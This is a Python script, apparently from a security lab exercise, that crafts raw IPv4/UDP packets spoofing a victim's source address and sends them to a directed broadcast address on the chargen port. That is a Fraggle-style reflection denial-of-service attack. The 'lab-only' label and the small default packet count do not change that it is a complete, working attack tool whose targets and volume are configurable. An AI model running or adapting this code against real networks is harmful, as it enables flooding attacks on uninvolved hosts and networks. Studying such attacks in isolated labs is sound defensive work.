#!/usr/bin/env python3
"""Send lab-only Fraggle-style UDP packets to a directed broadcast address."""

from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!{}H".format(len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def build_udp_packet(source: str, destination: str, source_port: int, destination_port: int, payload: bytes) -> bytes:
    length = 8 + len(payload)
    pseudo_header = (
        socket.inet_aton(source)
        + socket.inet_aton(destination)
        + struct.pack("!BBH", 0, socket.IPPROTO_UDP, length)
    )
    udp_header = struct.pack("!HHHH", source_port, destination_port, length, 0)
    udp_checksum = checksum(pseudo_header + udp_header + payload)
    if udp_checksum == 0:
        udp_checksum = 0xFFFF
    return struct.pack("!HHHH", source_port, destination_port, length, udp_checksum) + payload


def build_ipv4_packet(source: str, destination: str, payload: bytes, packet_id: int) -> bytes:
    version_ihl = (4 << 4) + 5
    total_length = 20 + len(payload)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        0,
        total_length,
        packet_id,
        0,
        64,
        socket.IPPROTO_UDP,
        0,
        socket.inet_aton(source),
        socket.inet_aton(destination),
    )
    header_checksum = checksum(header)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        0,
        total_length,
        packet_id,
        0,
        64,
        socket.IPPROTO_UDP,
        header_checksum,
        socket.inet_aton(source),
        socket.inet_aton(destination),
    )
    return header + payload


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Trigger a lab-only Fraggle-style attack.")
    parser.add_argument("--broadcast", default="10.152.0.255", help="directed broadcast address")
    parser.add_argument("--victim", default="10.151.0.71", help="spoofed victim source address")
    parser.add_argument("--source-port", type=int, default=7000, help="victim UDP port to receive replies")
    parser.add_argument("--destination-port", type=int, default=19, help="amplifier UDP service port")
    parser.add_argument("--count", type=int, default=3, help="number of spoofed UDP requests")
    parser.add_argument("--interval", type=float, default=0.2, help="seconds between requests")
    parser.add_argument("--payload-size", type=int, default=16, help="UDP payload size in bytes")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    packet_id = os.getpid() & 0xFFFF

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except PermissionError:
        print("raw socket permission denied; run inside a container with CAP_NET_RAW", file=sys.stderr)
        return 2

    for sequence in range(1, args.count + 1):
        payload = ("SEED-FRAGGLE-LAB-{}".format(sequence)).encode("ascii")
        payload = (payload * ((args.payload_size // len(payload)) + 1))[: args.payload_size]
        udp = build_udp_packet(
            args.victim,
            args.broadcast,
            args.source_port,
            args.destination_port,
            payload,
        )
        packet = build_ipv4_packet(args.victim, args.broadcast, udp, packet_id=packet_id + sequence)
        sock.sendto(packet, (args.broadcast, args.destination_port))
        print(
            "sent spoofed udp_request seq={} source={}:{} destination={}:{} bytes={}".format(
                sequence,
                args.victim,
                args.source_port,
                args.broadcast,
                args.destination_port,
                len(packet),
            ),
            flush=True,
        )
        if sequence != args.count:
            time.sleep(args.interval)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
